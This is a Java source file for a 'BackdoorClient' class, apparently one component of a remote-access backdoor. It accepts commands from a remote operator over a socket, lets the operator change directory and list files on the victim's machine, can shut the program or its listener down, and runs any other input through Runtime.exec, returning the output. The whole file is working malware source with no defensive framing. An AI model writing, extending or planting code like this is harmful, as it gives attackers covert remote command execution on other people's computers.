import java.net.Socket;
import java.net.ServerSocket;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.IOException;
import java.io.File;

class BackdoorClient extends Thread {

	private Socket socket;

	private BufferedReader reader;
	private BufferedWriter writer;

	private String workingDirectory;

	public BackdoorClient(Socket socket) {
		this.socket = socket;
		this.start();
	}

	public void run() {
		try {
			this.reader = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));
			this.writer = new BufferedWriter(new OutputStreamWriter(this.socket.getOutputStream()));
			this.workingDirectory = Util.getJARLoc();
			this.workingDirectory = this.workingDirectory.substring(0, this.workingDirectory.lastIndexOf("\\")) + "\\";
			this.write(this.workingDirectory);
			Debug.print("Wrote working dir\n");
			while(this.socket.isConnected() && MiscStatus.backdoorConnected) {
				try {
					String line = this.reader.readLine();
					if(line == null) {
						continue;
					} else {
						this.interpret(line);
						this.write(":END");
						this.write(this.workingDirectory);
					}
				} catch(IOException ioe) {
				}
			}
			MiscStatus.backdoorConnected = false;
		} catch(IOException ioe) {
			Debug.print("Backdoor reader / writer instantiation throwed IOException: " + ioe.toString());
			MiscStatus.backdoorConnected = false;
		}
	}

	private void interpret(String line) {
		String[] args = Util.splitArgs(line);
		if(args[0].equals("exit")) {
			try {
				this.reader.close();
				this.writer.close();
				this.socket.close();
			} catch(IOException ioe) {
			}
		} else if(args[0].equals("shutdown")) {
			System.exit(1);
		} else if(args[0].equals("shutdown listener")) {
			ServerStatus.backdoorListening = false;
		} else if(args[0].startsWith("cd")) {
			if(args.length == 2) {
				String dir = args[1];
				if(dir.indexOf(":\\") == -1) {
					File file = new File(this.workingDirectory + dir);
					if(file.exists()) {
						if(file.isDirectory()) {
							this.workingDirectory = this.workingDirectory + dir;
							if(!this.workingDirectory.endsWith("\\")) {
								this.workingDirectory = this.workingDirectory + "\\";
							}
						} else {
							this.write("No such directory: " + dir + "\n");
						}
					} else {
						this.write("No such directory: " + dir + "\n");
					}
				} else {
					File file = new File(dir);
					if(file.exists()) {
						if(file.isDirectory()) {
							this.workingDirectory = dir;
							if(!this.workingDirectory.endsWith("\\")) {
								this.workingDirectory = this.workingDirectory + "\\";
							}
						} else {
							this.write("No such directory: " + dir + "\n");
						}
					} else {
						this.write("No such directory: " + dir + "\n");
					}
				}
			}
		} else if(args[0].equals("ls")) {
			File dir = new File(this.workingDirectory);
			if(!dir.exists() || !dir.isDirectory()) {
				this.write("No files found.\n");
				return;
			}
			this.write("Contents of " + this.workingDirectory + ":\n\n");
			for(File file : dir.listFiles()) {
				if(file.isDirectory()) {
					this.write("<DIR> " + file.getName() + "\n");
				} else {
					long size = file.length();
					if(size >= (1024 * 1024 * 1024)) {
						this.write(file.getName() + " (" + (size / (1024 * 1024 * 1024)) + " GB)\n");
					} else if(size >= (1024 * 1024)) {
						this.write(file.getName() + " (" + (size / (1024 * 1024)) + " MB)\n");
					} else if(size >= 1024) {
						this.write(file.getName() + " (" + (size / 1024) + " KB)\n");
					} else if(size < 1024) {
						this.write(file.getName() + " (" + size + " bytes)\n");
					}
				}
				try {
					this.sleep(10);
				} catch(InterruptedException ie) {
				}
			}
		} else {
			try {
				Process process = Runtime.getRuntime().exec(line);
				if(line.indexOf(".exe") != -1) {
					return;
				}
				BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
				String str;
				while((str = in.readLine()) != null) {
					this.write(str + "\n");
				}
			} catch(IOException ioe) {
				try {
					Process process2 = Runtime.getRuntime().exec(this.workingDirectory + line);
					if(line.indexOf(".exe") != -1) {
						return;
					}
					BufferedReader in2 = new BufferedReader(new InputStreamReader(process2.getInputStream()));
					String str2;
					while((str2 = in2.readLine()) != null) {
						this.write(str2 + "\n");
					}
				} catch(IOException ioe2) {
					this.write("IOException thrown: " + ioe2.toString());
				}
			}
		}
	}

	private void write(String str) {
		str = str.replaceAll("\n", "");
		try {
			this.writer.write(str);
			this.writer.newLine();
			this.writer.flush();
		} catch(IOException ioe) {
		}
	}

}